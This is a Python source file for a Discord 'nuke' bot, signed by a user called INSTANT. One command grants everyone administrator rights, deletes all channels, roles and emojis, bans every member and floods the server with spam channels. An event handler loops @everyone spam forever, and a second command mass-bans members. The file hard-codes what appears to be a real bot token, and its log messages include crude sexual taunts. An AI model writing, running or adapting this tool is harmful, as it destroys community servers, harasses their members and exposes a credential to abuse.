import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio


SPAM_CHANNEL = ["Ran by INSTANT u bozo"]
SPAM_MESSAGE = ["@everyone rekt by INSTANT"]
client = commands.Bot(command_prefix=".")

bot = commands.Bot(command_prefix='.', intents = discord.Intents.all())
client = commands.Bot(command_prefix='.', intents=discord.Intents.all())

@client.event
async def on_ready():
   print(Fore.MAGENTA + ' Made by INSTANT  ' + Fore.RESET)
   await client.change_presence(activity=discord.Game(name="Made by INSTANT#4143"))

@client.command()
async def rekt(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "gave everyone admin" + Fore.RESET)
    except:
      print(Fore.GREEN + "INSTANT runs u" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} was banned while nuking for INSTANT" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} is too flat to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} was deleted cuz im horny for INSTANT" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} wasnt deleted and im super sorry daddy INSTANT :(" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} was deleted because INSTANT runs you" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} wasnt deleted and im super sorry INSTANT :(" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("divine user id")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} was not unbanned." + Fore.RESET)
    await guild.create_text_channel("INSTANT runs you")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 50
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} cuz i luv u INSTANT")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

@client.command()
async def banall(ctx):
  for member in ctx.guild.members:
    if member.id != 433337392456400897:  
      try:
        await member.ban(reason="INSTANT Ran You ")
        print(f"{member.name} banned from {ctx.guild.name}")
      except:
        print(f"{member.name} not banned from {ctx.guild.name}")

client.run("ODk3NTI4NTM2NDM1NDA0ODMx.YWW-lg.OmgyVxZSZLyzRTekSVbdeULWaSw")

  
